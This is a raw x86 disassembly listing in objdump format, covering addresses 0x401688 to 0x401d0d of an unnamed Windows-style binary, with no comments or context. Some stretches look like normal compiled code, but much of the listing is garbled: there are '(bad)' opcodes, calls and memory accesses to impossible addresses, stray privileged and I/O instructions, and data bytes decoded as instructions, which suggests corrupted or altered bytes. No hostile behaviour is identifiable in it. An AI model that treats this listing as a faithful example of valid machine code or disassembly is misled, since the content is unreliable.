  401688:	52                   	push   %edx
  401689:	6a 72                	push   $0x72
  40168b:	4f                   	dec    %edi
  40168c:	00 00                	add    %al,(%eax)
  40168e:	99                   	cltd
  40168f:	5e                   	pop    %esi
  401690:	33 76 5b             	xor    0x5b(%esi),%esi
  401693:	8b e5                	mov    %ebp,%esp
  401695:	5d                   	pop    %ebp
  401696:	c3                   	ret
  401697:	90                   	nop
  401698:	9b                   	fwait
  401699:	12 40 00             	adc    0x0(%eax),%al
  40169c:	74 12                	je     0x4016b0
  40169e:	40                   	inc    %eax
  40169f:	00 e2                	add    %ah,%dl
  4016a1:	13 40 00             	adc    0x0(%eax),%eax
  4016a4:	2e 13 df             	cs adc %edi,%ebx
  4016a7:	00 82 11 40 00 87    	add    %al,-0x78ffbfef(%edx)
  4016ad:	12 40 00             	adc    0x0(%eax),%al
  4016b0:	64 16                	fs push %ss
  4016b2:	63 00                	arpl   %eax,(%eax)
  4016b4:	46                   	inc    %esi
  4016b5:	42                   	inc    %edx
  4016b6:	57                   	push   %edi
  4016b7:	00 72 11             	add    %dh,0x11(%edx)
  4016ba:	40                   	inc    %eax
  4016bb:	00 ef                	add    %ch,%bh
  4016bd:	11 40 00             	adc    %eax,0x0(%eax)
  4016c0:	50                   	push   %eax
  4016c1:	60                   	pusha
  4016c2:	40                   	inc    %eax
  4016c3:	00 6d 11             	add    %ch,0x11(%ebp)
  4016c6:	40                   	inc    %eax
  4016c7:	00 4e 11             	add    %cl,0x11(%esi)
  4016ca:	40                   	inc    %eax
  4016cb:	00 08                	add    %cl,(%eax)
  4016cd:	23 40 00             	and    0x0(%eax),%eax
  4016d0:	2a 12                	sub    (%edx),%dl
  4016d2:	40                   	inc    %eax
  4016d3:	93                   	xchg   %eax,%ebx
  4016d4:	82 da 40             	sbb    $0x40,%dl
  4016d7:	00 bf 63 a9 00 8c    	add    %bh,-0x73ff569d(%edi)
  4016dd:	11 40 00             	adc    %eax,0x0(%eax)
  4016e0:	f6 10                	notb   (%eax)
  4016e2:	e9 aa 8e 12 87       	jmp    0x8752a591
  4016e7:	00 3d 12 0f 00 d3    	add    %bh,0xd3000f12
  4016ed:	11 40 00             	adc    %eax,0x0(%eax)
  4016f0:	59                   	pop    %ecx
  4016f1:	12 60 00             	adc    0x0(%eax),%ah
  4016f4:	76 14                	jbe    0x40170a
  4016f6:	28 5d a6             	sub    %bl,-0x5a(%ebp)
  4016f9:	14 40                	adc    $0x40,%al
  4016fb:	1e                   	push   %ds
  4016fc:	df 81 3f cb f3 14    	filds  0x14f3cb3f(%ecx)
  401702:	40                   	inc    %eax
  401703:	00 9f 15 40 00 00    	add    %bl,0x4015(%edi)
  401709:	b4 01                	mov    $0x1,%ah
  40170b:	1b 1b                	sbb    (%ebx),%ebx
  40170d:	1b 1b                	sbb    (%ebx),%ebx
  40170f:	02 1b                	add    (%ebx),%bl
  401711:	1b 1b                	sbb    (%ebx),%ebx
  401713:	1b 1b                	sbb    (%ebx),%ebx
  401715:	1b 1b                	sbb    (%ebx),%ebx
  401717:	03 1b                	add    (%ebx),%ebx
  401719:	1b 04 05 68 06 1b 07 	sbb    0x71b0668(,%eax,1),%eax
  401720:	23 1b                	and    (%ebx),%ebx
  401722:	1b 1b                	sbb    (%ebx),%ebx
  401724:	86 d8                	xchg   %bl,%al
  401726:	1b 1b                	sbb    (%ebx),%ebx
  401728:	1b 1c 09             	sbb    (%ecx,%ecx,1),%ebx
  40172b:	6b 0b 1b             	imul   $0x1b,(%ebx),%ecx
  40172e:	0c 59                	or     $0x59,%al
  401730:	db 1b                	fistpl (%ebx)
  401732:	0f 1b 1b             	bndstx %bnd3,(%ebx)
  401735:	10 1b                	adc    %bl,(%ebx)
  401737:	11 df                	adc    %ebx,%edi
  401739:	2a 1b                	sub    (%ebx),%bl
  40173b:	1c 15                	sbb    $0x15,%al
  40173d:	16                   	push   %ss
  40173e:	17                   	pop    %ss
  40173f:	18 19                	sbb    %bl,(%ecx)
  401741:	1a 90 90 90 90 90    	sbb    -0x6f6f6f70(%eax),%dl
  401747:	56                   	push   %esi
  401748:	d3 90 90 90 90 90    	rcll   %cl,-0x6f6f6f70(%eax)
  40174e:	90                   	nop
  40174f:	90                   	nop
  401750:	df 8b ff 79 45 08    	fisttps 0x84579ff(%ebx)
  401756:	56                   	push   %esi
  401757:	0d c8 c0 6b 00       	or     $0x6bc0c8,%eax
  40175c:	85 83 c1 7a 68 74    	test   %eax,0x74687ac1(%ebx)
  401762:	d2 40 00             	rolb   %cl,0x0(%eax)
  401765:	79 ff                	jns    0x401766
  401767:	15 59 c1 40 00       	adc    $0x40c159,%eax
  40176c:	a1 53 02 41 00       	mov    0x410253,%eax
  401771:	1c c4                	sbb    $0xc4,%al
  401773:	0c de                	or     $0xde,%al
  401775:	e0 74                	loopne 0x4017eb
  401777:	0f                   	movmskps (bad),%ebp
  401778:	50                   	push   %eax
  401779:	68 54 08 40 39       	push   $0x39400854
  40177e:	ff 15 64 c1 fc 00    	call   *0xfcc164
  401784:	83 c4 08             	add    $0x8,%esp
  401787:	6a 01                	push   $0x1
  401789:	40                   	inc    %eax
  40178a:	15 b6 c1 40 00       	adc    $0x40c1b6,%eax
  40178f:	fa                   	cli
  401790:	55                   	push   %ebp
  401791:	6e                   	outsb  %ds:(%esi),(%dx)
  401792:	d5 81                	aad    $0x81
  401794:	9c                   	pushf
  401795:	b8 cd 00 00 a1       	mov    $0xa10000cd,%eax
  40179a:	78 02                	js     0x40179e
  40179c:	41                   	inc    %ecx
  40179d:	00 85 c0 fa 4c 40    	add    %al,0x404cfac0(%ebp)
  4017a3:	41                   	inc    %ecx
  4017a4:	00 74 14 68          	add    %dh,0x68(%esp,%edx,1)
  4017a8:	40                   	inc    %eax
  4017a9:	3c 92                	cmp    $0x92,%al
  4017ab:	00 50 e8             	add    %dl,-0x18(%eax)
  4017ae:	9e                   	sahf
  4017af:	6f                   	outsl  %ds:(%esi),(%dx)
  4017b0:	00 36                	add    %dh,(%esi)
  4017b2:	66 2d 0d 32          	sub    $0x320d,%ax
  4017b6:	02 41 00             	add    0x0(%ecx),%al
  4017b9:	eb 14                	jmp    0x4017cf
  4017bb:	8b 15 00 5f 41 00    	mov    0x415f00,%edx
  4017c1:	06                   	push   %es
  4017c2:	50                   	push   %eax
  4017c3:	e8 88 40 00 54       	call   0x54405850
  4017c8:	66 8b 0d 25 17 41 00 	mov    0x411725,%cx
  4017cf:	a3 08 18 41 00       	mov    %eax,0x411808
  4017d4:	59                   	pop    %ecx
  4017d5:	87 02                	xchg   %eax,(%edx)
  4017d7:	74 00                	je     0x4017d9
  4017d9:	53                   	push   %ebx
  4017da:	56                   	push   %esi
  4017db:	8b 41 64             	mov    0x64(%ecx),%eax
  4017de:	65 40                	gs inc %eax
  4017e0:	00 66 89             	add    %ah,-0x77(%esi)
  4017e3:	9c                   	pushf
  4017e4:	f0 0b 41 00          	lock or 0x0(%ecx),%eax
  4017e8:	85 c0                	test   %eax,%eax
  4017ea:	57                   	push   %edi
  4017eb:	75 5d                	jne    0x40184a
  4017ed:	8b 15 00 18 41 31    	mov    0x31411800,%edx
  4017f3:	e3 68                	jecxz  0x40185d
  4017f5:	98                   	cwtl
  4017f6:	d4 e4                	aam    $0xe4
  4017f8:	00 ff                	add    %bh,%bh
  4017fa:	d6                   	salc
  4017fb:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4017fc:	78 02                	js     0x401800
  4017fe:	41                   	inc    %ecx
  4017ff:	00 83 c4 08 85 f6    	add    %al,-0x97af73c(%ebx)
  401805:	74 a7                	je     0x4017ae
  401807:	d4 74                	aam    $0x74
  401809:	02 5c 00 50          	add    0x50(%eax,%eax,1),%bl
  40180d:	68 40 3c 41 00       	push   $0x413c40
  401812:	68 84 d4 40 00       	push   $0x40d484
  401817:	ff d6                	call   *%esi
  401819:	83 c4 0c             	add    $0xc,%esp
  40181c:	a1 14 d0 40 00       	mov    0x40d014,%eax
  401821:	85 c3                	test   %eax,%ebx
  401823:	b8 80 d4 40 00       	mov    $0x40d480,%eax
  401828:	75 05                	jne    0x40182f
  40182a:	b8 7c d4 40 00       	mov    $0x40d47c,%eax
  40182f:	50                   	push   %eax
  401830:	34 6c                	xor    $0x6c,%al
  401832:	d4 40                	aam    $0x40
  401834:	00 ff                	add    %bh,%bh
  401836:	d6                   	salc
  401837:	8b 6f c8             	mov    -0x38(%edi),%ebp
  40183a:	c0 40 00 45          	rolb   $0x45,0x0(%eax)
  40183e:	c1 20 51             	shll   $0x51,(%eax)
  401841:	ff 15 54 08 40 00    	call   *0x400854
  401847:	83 c4 d1             	add    $0xffffffd1,%esp
  40184a:	8b 15 18 e8 40 00    	mov    0x40e818,%edx
  401850:	8b 35 58 c1 40 00    	mov    0x40c158,%esi
  401856:	68 60 08 00 00       	push   $0x860
  40185b:	52                   	push   %edx
  40185c:	ff d6                	call   *%esi
  40185e:	a3 b3 1b 41 00       	mov    %eax,0x411bb3
  401863:	a1 10 d9 40 db       	mov    0xdb40d910,%eax
  401868:	6a 20                	push   $0x20
  40186a:	50                   	push   %eax
  40186b:	ff 18                	lcall  *(%eax)
  40186d:	96                   	xchg   %eax,%esi
  40186e:	81 4c 40 41 00 8b 15 	orl    $0x18158b00,0x41(%eax,%eax,2)
  401875:	18 
  401876:	d0 1f                	rcrb   $1,(%edi)
  401878:	db 83 c4 10 a3 c8    	fildl  -0x375cef3c(%ebx)
  40187e:	0b 41 00             	or     0x0(%ecx),%eax
  401881:	02 00                	add    (%eax),%al
  401883:	51                   	push   %ecx
  401884:	52                   	push   %edx
  401885:	68 f8 17 90 00       	push   $0x9017f8
  40188a:	e8 81 17 00 00       	call   0x403010
  40188f:	85 c0                	test   %eax,%eax
  401891:	25 0e 50 68 50       	and    $0x5068500e,%eax
  401896:	d4 40                	aam    $0x40
  401898:	00 e8                	add    %ch,%al
  40189a:	a2 05 00 00 af       	mov    %al,0xaf000005
  40189f:	c4 08                	les    (%eax),%ecx
  4018a1:	a1 7c 02 41 00       	mov    0x41027c,%eax
  4018a6:	85 6f 75             	test   %ebp,0x75(%edi)
  4018a9:	35 a1 ac 0b 41       	xor    $0x410baca1,%eax
  4018ae:	23 8b 0d 9c 0b 41    	and    0x410b9c0d(%ebx),%ecx
  4018b4:	00 8b 15 48 40 41    	add    %cl,0x41404815(%ebx)
  4018ba:	00 0b                	add    %cl,(%ebx)
  4018bc:	44                   	inc    %esp
  4018bd:	29 9c d1 ba 00 50 a1 	sub    %ebx,-0x5eafff46(%ecx,%edx,8)
  4018c4:	4c                   	dec    %esp
  4018c5:	40                   	inc    %eax
  4018c6:	61                   	popa
  4018c7:	2a 51 68             	sub    0x68(%ecx),%dl
  4018ca:	aa                   	stos   %al,%es:(%edi)
  4018cb:	d4 40                	aam    $0x40
  4018cd:	3b 16                	cmp    (%esi),%edx
  4018cf:	50                   	push   %eax
  4018d0:	09 bb 79 00 00 83    	or     %edi,-0x7cffff87(%ebx)
  4018d6:	c4 1c 4a             	les    (%edx,%ecx,2),%ebx
  4018d9:	48                   	dec    %eax
  4018da:	40                   	inc    %eax
  4018db:	41                   	inc    %ecx
  4018dc:	00 eb                	add    %ch,%bl
  4018de:	05 a1 48 40 2d       	add    $0x2d4048a1,%eax
  4018e3:	00 8b 0d 80 02 41    	add    %cl,0x4102800d(%ebx)
  4018e9:	00 85 c9 75 26 8b    	add    %al,-0x74d98a37(%ebp)
  4018ef:	0d 4c 40 41 00       	or     $0x41404c,%eax
  4018f4:	2f                   	das
  4018f5:	00 68 5c             	add    %ch,0x5c(%eax)
  4018f8:	98                   	cwtl
  4018f9:	40                   	inc    %eax
  4018fa:	00 5c 44 74          	add    %bl,0x74(%esp,%eax,2)
  4018fe:	7c 00                	jl     0x401900
  401900:	68 28 d4 40 3f       	push   $0x3f40d428
  401905:	50                   	push   %eax
  401906:	51                   	push   %ecx
  401907:	e8 84 3f 00 00       	call   0x405890
  40190c:	25 c4 18 a3 52       	and    $0x52a318c4,%eax
  401911:	40                   	inc    %eax
  401912:	41                   	inc    %ecx
  401913:	00 8b 7f 84 02 41    	add    %cl,0x4102847f(%ebx)
  401919:	00 85 c9 c4 1c 78    	add    %al,0x781cc4c9(%ebp)
  40191f:	15 4c 40 41 c7       	adc    $0xc741404c,%eax
  401924:	6a 00                	push   $0x0
  401926:	68 18 00 40 00       	push   $0x400018
  40192b:	95                   	xchg   %eax,%ebp
  40192c:	52                   	push   %edx
  40192d:	e8 5e 3f 00 fa       	call   0xfa405890
  401932:	0f 06                	clts
  401934:	31 a3 48 bd 41 79    	xor    %esp,0x7941bd48(%ebx)
  40193a:	72 0d                	jb     0x401949
  40193c:	60                   	pusha
  40193d:	f0 41                	lock inc %ecx
  40193f:	00 bb c9 7f 63 8b    	add    %bh,-0x749c8037(%ebx)
  401945:	15 39 02 41 00       	adc    $0x410239,%eax
  40194a:	0b fc                	or     %esp,%edi
  40194c:	f8                   	clc
  40194d:	40                   	inc    %eax
  40194e:	00 85 d2 43 05 be    	add    %al,-0x41fabc2e(%ebp)
  401954:	b7 02                	mov    $0x2,%bh
  401956:	41                   	inc    %ecx
  401957:	00 8b 15 1a 02 41    	add    %cl,0x41021a15(%ebx)
  40195d:	ae                   	scas   %es:(%edi),%al
  40195e:	85 2c a8             	test   %ebp,(%eax,%ebp,4)
  401961:	15 40 40 28 00       	adc    $0x284040,%eax
  401966:	75 06                	jne    0x40196e
  401968:	8b 15 e4 a1 41 00    	mov    0x41a1e4,%edx
  40196e:	85 f1                	test   %esi,%ecx
  401970:	8c f8                	mov    %?,%eax
  401972:	d3 40 00             	roll   %cl,0x0(%eax)
  401975:	74 05                	je     0x40197c
  401977:	71 e0                	jno    0x401959
  401979:	f9                   	stc
  40197a:	40                   	inc    %eax
  40197b:	00 50 a1             	add    %dl,-0x5f(%eax)
  40197e:	24 18                	and    $0x18,%al
  401980:	41                   	inc    %ecx
  401981:	72 50                	jb     0x4019d3
  401983:	a1 44 f6 41 00       	mov    0x41f644,%eax
  401988:	50                   	push   %eax
  401989:	56                   	push   %esi
  40198a:	52                   	push   %edx
  40198b:	51                   	push   %ecx
  40198c:	72 0d                	jb     0x40199b
  40198e:	30 33                	xor    %dh,(%ebx)
  401990:	40                   	inc    %eax
  401991:	d6                   	salc
  401992:	94                   	xchg   %eax,%esp
  401993:	1f                   	pop    %ds
  401994:	d3 40 9f             	roll   %cl,-0x61(%eax)
  401997:	68 43 08 00 00       	push   $0x843
  40199c:	51                   	push   %ecx
  40199d:	e8 2a 6c 00 ac       	call   0xac4085cc
  4019a2:	83 c4 24             	add    $0x24,%esp
  4019a5:	eb 55                	jmp    0x4019fc
  4019a7:	b6 15                	mov    $0x15,%dh
  4019a9:	40                   	inc    %eax
  4019aa:	38 41 00             	cmp    %al,0x0(%ecx)
  4019ad:	60                   	pusha
  4019ae:	40                   	inc    %eax
  4019af:	83 dd 00             	sbb    $0x0,%ebp
  4019b2:	84 d2                	test   %dl,%dl
  4019b4:	3f                   	aas
  4019b5:	d3 bf c8 fc 40 00    	sarl   %cl,0x40fcc8(%edi)
  4019bb:	8b 15 56 02 41 00    	mov    0x410256,%edx
  4019c1:	be fc d3 40 00       	mov    $0x40d3fc,%esi
  4019c6:	85 d2                	test   %edx,%edx
  4019c8:	75 05                	jne    0x4019cf
  4019ca:	c5 d4 02             	(bad)
  4019cd:	41                   	inc    %ecx
  4019ce:	00 8b 15 78 a2 5f    	add    %cl,0x5fa27815(%ebx)
  4019d4:	00 85 d2 8b 15 40    	add    %al,0x40158bd2(%ebp)
  4019da:	40                   	inc    %eax
  4019db:	67 00 75 06          	add    %dh,0x6(%di)
  4019df:	8b 15 e4 17 41 00    	mov    0x4117e4,%edx
  4019e5:	83 19 01             	sbbl   $0x1,(%ecx)
  4019e8:	b9 c0 d3 40 00       	mov    $0x40d3c0,%ecx
  4019ed:	90                   	nop
  4019ee:	05 b9 bc d3 40       	add    $0x40d3bcb9,%eax
  4019f3:	00 50 3d             	add    %dl,0x3d(%eax)
  4019f6:	4f                   	dec    %edi
  4019f7:	02 41 e7             	add    -0x19(%ecx),%al
  4019fa:	13 50 d5             	adc    -0x2b(%eax),%edx
  4019fd:	04 18                	add    $0x18,%al
  4019ff:	41                   	inc    %ecx
  401a00:	00 50 a1             	add    %dl,-0x5f(%eax)
  401a03:	44                   	inc    %esp
  401a04:	40                   	inc    %eax
  401a05:	41                   	inc    %ecx
  401a06:	00 50 56             	add    %dl,0x56(%eax)
  401a09:	52                   	push   %edx
  401a0a:	51                   	push   %ecx
  401a0b:	8b 0d 30 d0 40 00    	mov    0x40d030,%ecx
  401a11:	68 78 d3 40 00       	push   $0x40d378
  401a16:	8e 00                	mov    (%eax),%es
  401a18:	08 89 46 51 2d 5f    	or     %cl,0x5f2d5146(%ecx)
  401a1e:	6c                   	insb   (%dx),%es:(%edi)
  401a1f:	00 00                	add    %al,(%eax)
  401a21:	83 c4 57             	add    $0x57,%esp
  401a24:	3d ae 08 00 f0       	cmp    $0xf00008ae,%eax
  401a29:	21 0d 68 64 d3 40    	and    %ecx,0x40d36468
  401a2f:	5f                   	pop    %edi
  401a30:	e8 1b fd ff ff       	call   0x401750
  401a35:	83 c4 04             	add    $0x4,%esp
  401a38:	a1 58 02 41 00       	mov    0x410258,%eax
  401a3d:	bb 02 00 00 00       	mov    $0x2,%ebx
  401a42:	3b c3                	cmp    %ebx,%eax
  401a44:	7c 29                	jl     0x401a6f
  401a46:	a1 60 02 41 00       	mov    0x410260,%eax
  401a4b:	3b c3                	cmp    %ebx,%eax
  401a4d:	2f                   	das
  401a4e:	bc d3 40 00 74       	mov    $0x740040d3,%esp
  401a53:	05 b8 c0 d3 40       	add    $0x40d3c0b8,%eax
  401a58:	00 8b 15 71 d0 40    	add    %cl,0x40d07115(%ebx)
  401a5e:	00 0c 50             	add    %cl,(%eax,%edx,2)
  401a61:	68 44 d3 18 00       	push   $0x18d344
  401a66:	ff 15 05 c1 40 00    	call   *0x40c105
  401a6c:	83 78 0c 8b          	cmpl   $0xffffff8b,0xc(%eax)
  401a70:	3d 30 d0 40 00       	cmp    $0x40d030,%eax
  401a75:	83 c7 ff             	add    $0xffffffff,%edi
  401a78:	33 c0                	xor    %eax,%eax
  401a7a:	f2 ae                	repnz scas %es:(%edi),%al
  401a7c:	a1 60 02 58 f8       	mov    0xf8580260,%eax
  401a81:	f7 d1                	not    %ecx
  401a83:	49                   	dec    %ecx
  401a84:	83 f8 01             	cmp    $0x1,%eax
  401a87:	89 0d 78 17 41 a9    	mov    %ecx,0xa9411778
  401a8d:	7c 70                	jl     0x401aff
  401a8f:	a1 70 02 41 00       	mov    0x410270,%eax
  401a94:	8d 4c 01 01          	lea    0x1(%ecx,%eax,1),%ecx
  401a98:	4c                   	dec    %esp
  401a99:	ff 15 5c 4d 40 00    	call   *0x404d5c
  401a9f:	d2 c4                	rol    %cl,%ah
  401aa1:	04 85                	add    $0x85,%al
  401aa3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401aa4:	ec                   	in     (%dx),%al
  401aa5:	1f                   	pop    %ds
  401aa6:	69 15 c8 c0 ab 00 68 	imul   $0x40d31468,0xabc0c8,%edx
  401aad:	14 d3 40 
  401ab0:	00 83 c2 ff 52 ff    	add    %al,-0xad003e(%ebx)
  401ab6:	15 80 72 47 00       	adc    $0x477280,%eax
  401abb:	83 c4 08             	add    $0x8,%esp
  401abe:	5f                   	pop    %edi
  401abf:	35 5b 8b e5 5d       	xor    $0x5de58b5b,%eax
  401ac4:	c3                   	ret
  401ac5:	8b 15 42 d0 40 00    	mov    0x40d042,%edx
  401acb:	8b f0                	mov    %eax,%esi
  401acd:	8a 0a                	mov    (%edx),%cl
  401acf:	d3 88 0e 79 84 c9    	rorl   %cl,-0x367b86f2(%eax)
  401ad5:	64 f6 8b 99 ec 17 41 	testb  $0x0,%fs:0x4117ec99(%ebx)
  401adc:	00 
  401add:	8b 0d 70 02 18 00    	mov    0x180270,%ecx
  401ae3:	3e 35 20 38 41 00    	ds xor $0x413820,%eax
  401ae9:	8d 3c 02             	lea    (%edx,%eax,1),%edi
  401aec:	8b d1                	mov    %ecx,%edx
  401aee:	c1 55 02 f3          	rcll   $0xf3,0x2(%ebp)
  401af2:	79 f7                	jns    0x401aeb
  401af4:	ca 6b e1             	lret   $0xe16b
  401af7:	03 f3                	add    %ebx,%esi
  401af9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401afa:	90                   	nop
  401afb:	30 1c 40             	xor    %bl,(%eax,%eax,2)
  401afe:	00 e6                	add    %ah,%dh
  401b00:	4c                   	dec    %esp
  401b01:	40                   	inc    %eax
  401b02:	f3 00 66 8b          	repz add %ah,-0x75(%esi)
  401b06:	0d b4 0b 41 00       	or     $0x410bb4,%eax
  401b0b:	8b 15 08 18 41 00    	mov    0x411808,%edx
  401b11:	50                   	push   %eax
  401b12:	6a 00                	push   $0x0
  401b14:	48                   	dec    %eax
  401b15:	6a 00                	push   $0x0
  401b17:	46                   	inc    %esi
  401b18:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401b19:	fc                   	cld
  401b1a:	17                   	pop    %ss
  401b1b:	8a 00                	mov    (%eax),%al
  401b1d:	e8 0e 54 1c 85       	call   0x855c6f30
  401b22:	8b f0                	mov    %eax,%esi
  401b24:	66 76 f6             	data16 jbe 0x401b1d
  401b27:	74 2c                	je     0x401b55
  401b29:	a1 08 18 41 36       	mov    0x36411808,%eax
  401b2e:	8d 8d 48 ff 40 a2    	lea    -0x5dbf00b8(%ebp),%ecx
  401b34:	50                   	push   %eax
  401b35:	68 f4 d2 40 00       	push   $0x40d2f4
  401b3a:	6a 0a                	push   $0xa
  401b3c:	d1 e8                	shr    $1,%eax
  401b3e:	3e 6b 00 00          	imul   $0x0,%ds:(%eax),%eax
  401b42:	0f bf d6             	movswl %si,%edx
  401b45:	8d 85 48 ff ff ff    	lea    -0xb8(%ebp),%eax
  401b4b:	52                   	push   %edx
  401b4c:	50                   	push   %eax
  401b4d:	e8 26 02 00 00       	call   0x401d78
  401b52:	83 c4 18             	add    $0x18,%esp
  401b55:	e8 a6 4e b8 00       	call   0xf86a00
  401b5a:	8b f0                	mov    %eax,%esi
  401b5c:	a1 6e 5e 41 00       	mov    0x415e6e,%eax
  401b61:	a0 fa 89 35 a0       	mov    0xa03589fa,%al
  401b66:	09 41 00             	or     %eax,0x0(%ecx)
  401b69:	85 e6                	test   %esp,%esi
  401b6b:	89 a3 aa 20 41 00    	mov    %esp,0x4120aa(%ebx)
  401b71:	89 35 c0 0b 41 00    	mov    %esi,0x410bc0
  401b77:	93                   	xchg   %eax,%ebx
  401b78:	3d c4 0b 41 00       	cmp    $0x410bc4,%eax
  401b7d:	79 30                	jns    0x401baf
  401b7f:	22 6a 00             	and    0x0(%edx),%ch
  401b82:	68 40 42 0f 4b       	push   $0x4b0f4240
  401b87:	52                   	push   %edx
  401b88:	50                   	push   %eax
  401b89:	e8 b2 99 00 00       	call   0x40b540
  401b8e:	03 c6                	add    %esi,%eax
  401b90:	44                   	inc    %esp
  401b91:	ec                   	in     (%dx),%al
  401b92:	60                   	pusha
  401b93:	45                   	inc    %ebp
  401b94:	ec                   	in     (%dx),%al
  401b95:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401b98:	eb 0e                	jmp    0x401ba8
  401b9a:	c7 45 ec fe ff ed ff 	movl   $0xffedfffe,-0x14(%ebp)
  401ba1:	c7 45 f0 ad ff ff 27 	movl   $0x27ffffad,-0x10(%ebp)
  401ba8:	68 60 20 40 00       	push   $0x402060
  401bad:	53                   	push   %ebx
  401bae:	ff 15 60 48 40 bf    	call   *0xbf404860
  401bb4:	a1 18 33 c6 00       	mov    0xc63318,%eax
  401bb9:	d3 c4                	rol    %cl,%esp
  401bbb:	08 33                	or     %dh,(%ebx)
  401bbd:	f6 85 62 7e 45 33 ff 	testb  $0xff,0x33457e62(%ebp)
  401bc4:	8b 0d b0 0b 41 00    	mov    0x410bb0,%ecx
  401bca:	89 b4 0f 6f 08 00 12 	mov    %esi,0x1200086f(%edi,%ecx,1)
  401bd1:	8b 15 b0 3a 41 00    	mov    0x413ab0,%edx
  401bd7:	8d 04 5e             	lea    (%esi,%ebx,2),%eax
  401bda:	50                   	push   %eax
  401bdb:	e8 80 1c 00 00       	call   0x403860
  401be0:	a1 18 d0 40 00       	mov    0x40d018,%eax
  401be5:	83 c4 04             	add    $0x4,%esp
  401be8:	46                   	inc    %esi
  401be9:	f0 c7                	lock (bad)
  401beb:	60                   	pusha
  401bec:	08 00                	or     %al,(%eax)
  401bee:	00 7d f0             	add    %bh,-0x10(%ebp)
  401bf1:	7c d1                	jl     0x401bc4
  401bf3:	8b 0d 81 b3 40 00    	mov    0x40b381,%ecx
  401bf9:	8d 55 e8             	lea    -0x18(%ebp),%edx
  401bfc:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401bff:	1d 0d 2c d0 a0       	sbb    $0xa0d02c0d,%eax
  401c04:	00 8d aa fc 84 8b    	add    %cl,-0x747b0356(%ebp)
  401c0a:	15 28 df 40 e4       	adc    $0xe440df28,%eax
  401c0f:	b6 a1                	mov    $0xa1,%dh
  401c11:	bf 17 41 b0 15       	mov    $0x15b04117,%edi
  401c16:	52                   	push   %edx
  401c17:	da 9e 83 47 00 00    	ficompl 0x4783(%esi)
  401c1d:	85 c0                	test   %eax,%eax
  401c1f:	74 0e                	je     0x401c2f
  401c21:	50                   	push   %eax
  401c22:	68 e8 16 24 ad       	push   $0xad2416e8
  401c27:	e8 14 02 00 00       	call   0x401e40
  401c2c:	c7                   	(bad)
  401c2d:	3c 08                	cmp    $0x8,%al
  401c2f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401c32:	85 b4 3a 0d 68 d4 7a 	test   %esi,0x7ad4680d(%edx,%edi,1)
  401c39:	40                   	inc    %eax
  401c3a:	7f e8                	jg     0x401c24
  401c3c:	ea fb ff ff 83 6e 04 	ljmp   $0x46e,$0x83fffffb
  401c43:	d3 45 fc             	roll   %cl,-0x4(%ebp)
  401c46:	c7 45 f4 d6 00 00 00 	movl   $0xd6,-0xc(%ebp)
  401c4d:	85 c0                	test   %eax,%eax
  401c4f:	0f                   	xcrypt-ctr (bad)
  401c50:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  401c51:	5f                   	pop    %edi
  401c52:	01 06                	add    %eax,(%esi)
  401c54:	00 c7                	add    %al,%bh
  401c56:	45                   	inc    %ebp
  401c57:	f8                   	clc
  401c58:	00 00                	add    %al,(%eax)
  401c5a:	1e                   	push   %ds
  401c5b:	00 8b 4d f8 8b 45    	add    %cl,0x458bf84d(%ebx)
  401c61:	e8 8b a2 01 10       	call   0x1041bef1
  401c66:	8b 4e 03             	mov    0x3(%esi),%ecx
  401c69:	85 c9                	test   %ecx,%ecx
  401c6b:	0f 84 96 01 00 00    	je     0x401e07
  401c71:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401c74:	66 8b 5c 5f 0a       	mov    0xa(%edi,%ebx,2),%bx
  401c79:	aa                   	stos   %al,%es:(%edi)
  401c7a:	c3                   	ret
  401c7b:	23 74 62 56          	and    0x56(%edx,%eiz,2),%esi
  401c7f:	e8 70 1f 00 00       	call   0x403bf4
  401c84:	83 c4 b6             	add    $0xffffffb6,%esp
  401c87:	c0 c3 50             	rol    $0x50,%bl
  401c8a:	0f 85 e6 00 00 00    	jne    0x401d76
  401c90:	f6 c3 04             	test   $0x4,%bl
  401c93:	0f bb b1 00 d6 00 30 	btc    %esi,0x3000d600(%ecx)
  401c9a:	7e 08                	jle    0x401ca4
  401c9c:	f8                   	clc
  401c9d:	0f 85 9e 00 00 00    	jne    0x401d41
  401ca3:	ce                   	into
  401ca4:	cb                   	lret
  401ca5:	17                   	pop    %ss
  401ca6:	41                   	inc    %ecx
  401ca7:	00 8b 0e 04 50 51    	add    %cl,0x5150040e(%ebx)
  401cad:	85 8e 4b 00 00 8b    	test   %ecx,-0x74ffffb5(%esi)
  401cb3:	0d f8 17 41 00       	or     $0x4117f8,%eax
  401cb8:	d0 56 04             	rclb   $1,0x4(%esi)
  401cbb:	8b f8                	mov    %eax,%edi
  401cbd:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401cc0:	50                   	push   %eax
  401cc1:	6e                   	outsb  %ds:(%esi),(%dx)
  401cc2:	c7 45 c4 01 00 00 00 	movl   $0x1,-0x3c(%ebp)
  401cc9:	39 55 cc             	cmp    %edx,-0x34(%ebp)
  401ccc:	e8 2f 45 00 00       	call   0x406200
  401cd1:	66 85 ff             	test   %di,%di
  401cd4:	f1                   	int1
  401cd5:	57                   	push   %edi
  401cd6:	a3 56 b6 52 e8       	mov    %eax,0xe852b656
  401cdb:	31 4b 00             	xor    %ecx,0x0(%ebx)
  401cde:	00 8b 1d c4 02 3b    	add    %cl,0x3b02c41d(%ebx)
  401ce4:	18 a1 b8 95 41 6b    	sbb    %ah,0x6b4195b8(%ecx)
  401cea:	43                   	inc    %ebx
  401ceb:	e6 3d                	out    %al,$0x3d
  401ced:	3f                   	aas
  401cee:	83 9e 0a 89 79 ff a7 	sbbl   $0xffffffa7,-0x8676f6(%esi)
  401cf5:	2d 00 a3 b8 02       	sub    $0x2b8a300,%eax
  401cfa:	41                   	inc    %ecx
  401cfb:	00 7e 26             	add    %bh,0x26(%esi)
  401cfe:	8b 15 c8 c0 40 00    	mov    0x40c0c8,%edx
  401d04:	cc                   	int3
  401d05:	b0 d2                	mov    $0xd2,%al
  401d07:	40                   	inc    %eax
  401d08:	88 28                	mov    %ch,(%eax)
  401d0a:	c2 40 52             	ret    $0x5240
  401d0d:	ff 15 b4 c1 40 00    	call   *0x40c1b4
